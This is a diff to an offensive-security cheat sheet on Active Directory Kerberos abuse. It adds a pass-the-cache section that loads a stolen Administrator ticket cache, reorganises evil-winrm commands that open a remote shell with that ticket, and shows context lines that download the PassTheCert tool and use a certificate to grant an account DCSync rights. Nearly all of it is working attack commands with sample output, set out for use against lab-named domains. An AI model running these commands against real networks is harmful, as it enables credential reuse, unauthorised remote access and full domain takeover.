@@ -26,6 +26,21 @@ klist
 
 ## Pass-the-Cache
 
+### General
+
+```bash
+### just place the TGS ccache file into KRB5CCNAME environment variable
+
+la Administrator@HOST_WIN-NUU0DPB1BVC@CONTOSO.ORG.ccache
+# -rw-rw-r-- 1 kali kali ? 1.6K Oct 19 15:11 Administrator@HOST_WIN-NUU0DPB1BVC@CONTOSO.ORG.ccache
+
+export KRB5CCNAME='Administrator@HOST_WIN-NUU0DPB1BVC@CONTOSO.ORG.ccache'
+
+klist
+# Ticket cache: FILE:Administrator@HOST_WIN-NUU0DPB1BVC@CONTOSO.ORG.ccache
+# Default principal: Administrator@contoso.org
+```
+
 ### WMI
 
 ```bash
@@ -75,6 +90,22 @@ C:\>whoami
 C:\>
 ```
 
+### WinRM
+
+```bash
+# MAKE SURE /etc/krb5.conf HAS THE contoso.org DOMAIN SPECIFIED
+# MAKE SURE -i INCLUDES FQDN AND THAT IT IS RESOLVABLE
+# make sure the SPN is HTTP/...
+export KRB5CCNAME=Administrator.ccache && evil-winrm -i WIN-KML6TP4LOOL.contoso.org -r contoso.org
+
+# IF SPN is WSMAN or HOST or ANY other - specify it in --spn parameter
+evil-winrm -i WIN-KML6TP4LOOL.contoso.org -r contoso.org --spn WSMAN
+```
+
+## Pass-the-Cert
+
+### WMI
+
 ```bash
 ### PKINIT is enabled
 # use a pfx file with certipy-ad
@@ -96,16 +127,4 @@ wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/
 # now you can grant yourself DCSync privs, modify user's password or change DC's msDS-AllowedToActOnBehalfOfOtherIdentity for RBAC
 # This (modify_user + -elevate) will grant the user account DCSync privileges
 python3 ./passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target kelly.hill -elevate -domain push.vl -dc-host dc01.push.vl
-```
-
-### WinRM
-
-```bash
-# MAKE SURE /etc/krb5.conf HAS THE contoso.org DOMAIN SPECIFIED
-# MAKE SURE -i INCLUDES FQDN AND THAT IT IS RESOLVABLE
-# make sure the SPN is HTTP/...
-export KRB5CCNAME=Administrator.ccache && evil-winrm -i WIN-KML6TP4LOOL.contoso.org -r contoso.org
-
-# IF SPN is WSMAN or HOST or ANY other - specify it in --spn parameter
-evil-winrm -i WIN-KML6TP4LOOL.contoso.org -r contoso.org --spn WSMAN
 ```
